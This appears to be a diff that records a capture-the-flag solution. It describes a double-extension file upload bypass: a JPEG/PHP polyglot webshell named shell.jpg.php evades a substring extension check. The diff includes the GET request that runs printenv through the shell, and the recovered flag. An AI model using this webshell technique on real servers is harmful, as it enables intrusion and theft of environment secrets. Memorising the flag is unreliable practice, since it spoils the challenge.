@@ -1,0 +1,4 @@
+# Double extension bypass: uploaded shell.jpg.php (JPEG polyglot + PHP webshell). Extension check uses substring match for .jpg, not end-anchored. JPEG magic bytes satisfy structure check. Apache executes .php extension. printenv reveals FLAG=flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}
+
+GET /upload/shell.jpg.php?cmd=printenv HTTP/1.1
+Host: 172.17.0.1:44925
